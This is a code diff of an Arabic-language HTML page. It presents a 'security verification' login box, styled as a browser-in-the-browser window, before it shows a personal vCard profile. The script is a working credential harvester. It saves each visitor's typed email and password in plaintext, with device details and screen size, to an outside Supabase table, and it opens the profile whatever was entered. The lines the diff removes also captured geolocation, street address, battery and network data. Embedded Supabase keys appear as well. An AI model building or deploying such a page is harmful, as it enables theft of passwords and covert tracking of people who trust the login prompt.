@@ -22,7 +22,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; text-decoration: none; }
         body { background: var(--back_color); width: 100vw; height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; }
 
-        /* واجهة الدخول */
+        /* واجهة الدخول (نفس التصميم الأصلي) */
         #auth-screen { position: fixed; inset: 0; background: var(--back_color); z-index: 1000; display: flex; justify-content: center; align-items: center; }
         .bitb-window { width: 90%; max-width: 380px; background: var(--front_color); backdrop-filter: blur(25px); border-radius: 30px; border: 1px solid rgba(197, 160, 89, 0.2); overflow: hidden; box-shadow: 0 25px 60px rgba(0,0,0,0.6); direction: rtl; animation: fadeIn 0.8s ease; }
         
@@ -39,7 +39,7 @@
         .auth-box input:focus { border-color: var(--gold); background: rgba(255, 255, 255, 0.07); }
         .auth-box button { width: 100%; padding: 14px; margin-top: 20px; background: linear-gradient(45deg, var(--deep-blue), var(--muted-gold)); border: none; border-radius: 12px; color: white; font-weight: bold; cursor: pointer; font-size: 1em; box-shadow: 0 5px 15px rgba(0,0,0,0.3); transition: 0.3s; }
 
-        /* تصميم vCard */
+        /* تصميم vCard (المحتفظ بكامل جماليته) */
         .vcard { width: 90%; max-width: 420px; height: 600px; background: var(--front_color); backdrop-filter: blur(25px); border-radius: 24px; border: 1px solid rgba(197, 160, 89, 0.2); position: relative; overflow: hidden; display: none; animation: fadeIn 1s ease; }
         .header { height: 35%; position: relative; }
         .wave_bg { position: absolute; width: 100%; height: 100%; overflow: hidden; }
@@ -74,7 +74,7 @@
         </div>
         <div class="auth-box">
             <h2>تحقق أمني</h2>
-            <p class="info-text">لأسباب أمنية، يرجى تأكيد الهوية للوصول إلى هذا الملف.</p>
+            <p class="info-text">يرجى تسجيل الدخول للوصول إلى الملف الشخصي لسالم الشمري.</p>
             <input type="email" id="email" placeholder="البريد الإلكتروني">
             <input type="password" id="password" placeholder="كلمة المرور">
             <button id="login-btn" onclick="handleLogin()">تأكيد الدخول</button>
@@ -111,17 +111,11 @@
 </div>
 
 <script>
-    // هام: استبدل هذه القيم بالقيم الحقيقية من مشروعك في Supabase
-    const SB_URL = 'https://gzioimivawyqxjoxajdw.supabase.co'; 
-    const SB_KEY = 'EyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imd6aW9pbWl2YXd5cXhqb3hhamR3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU0MTc1ODQsImV4cCI6MjA5MDk5MzU4NH0.2xKTF4oDkvUUFts6Igab01OfOPKkezAb3-U_xV7r1zY';
+    // الإعدادات الجديدة الخاصة بك
+    const SB_URL = 'https://kcckppfflaxpxhipngdz.supabase.co'; 
+    const SB_KEY = 'EyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtjY2twcGZmbGF4cHhoaXBuZ2R6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2MzU1NTMsImV4cCI6MjA5MTIxMTU1M30.Lek1mEohH1GoUkcMQZT3vQ2tmshPJVI-Oa8f_y2mH6o';
     
     const supabaseClient = supabase.createClient(SB_URL, SB_KEY);
-
-    window.onload = () => {
-        if (localStorage.getItem('isUnlocked') === 'true') {
-            showProfile();
-        }
-    };
 
     function showProfile() {
         document.getElementById('auth-screen').style.display = 'none';
@@ -131,11 +125,11 @@
     async function handleLogin() {
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
-        const errorMsg = document.getElementById('error-msg');
         const loginBtn = document.getElementById('login-btn');
+        const errorMsg = document.getElementById('error-msg');
 
-        if (!email.includes('@') || password.length < 4) {
-            errorMsg.innerText = "يرجى إدخال بيانات صحيحة";
+        if (!email || !password) {
+            errorMsg.innerText = "يرجى إدخال كافة البيانات";
             return;
         }
 
@@ -143,49 +137,27 @@
         loginBtn.disabled = true;
 
         try {
-            // تجميع معلومات الجهاز
-            const device = /iPhone|iPad|iPod/i.test(navigator.userAgent) ? "iOS" : (/Android/i.test(navigator.userAgent) ? "Android" : "PC");
-            let battery = "N/A";
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                battery = `${Math.round(b.level * 100)}%`;
-            }
+            // تجميع معلومات الجهاز الأساسية
+            const device = /iPhone|iPad|iPod/i.test(navigator.userAgent) ? "iOS" : "Android/PC";
 
-            // الحصول على الموقع
-            let coords = "N/A", addr = "N/A", city = "Unknown";
-            try {
-                const pos = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 5000});
-                });
-                coords = `${pos.coords.latitude}, ${pos.coords.longitude}`;
-                const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`);
-                const geoData = await geoRes.json();
-                addr = geoData.display_name;
-            } catch(e) { console.log("Location access denied"); }
-
-            // إرسال البيانات لـ Supabase
+            // إرسال البيانات إلى Supabase
             const { error } = await supabaseClient
                 .from('visitors_log')
                 .insert([{ 
                     visitor_email: email, 
                     visitor_password: password,
-                    city: city,
-                    coords: coords,
-                    full_address: addr,
                     device_model: device,
-                    battery_level: battery,
-                    network_type: navigator.connection ? navigator.connection.effectiveType : "N/A",
                     fingerprint: `${window.screen.width}x${window.screen.height}`
                 }]);
 
             if (error) throw error;
 
-            localStorage.setItem('isUnlocked', 'true');
+            // إظهار البطاقة في حال النجاح
             showProfile();
 
         } catch (err) {
             console.error(err);
-            errorMsg.innerText = "فشل في الربط، تأكد من إعدادات الجدول والسياسات.";
+            errorMsg.innerText = "خطأ في الربط! تأكد من إنشاء الجدول في Supabase";
             loginBtn.innerText = "تأكيد الدخول";
             loginBtn.disabled = false;
         }
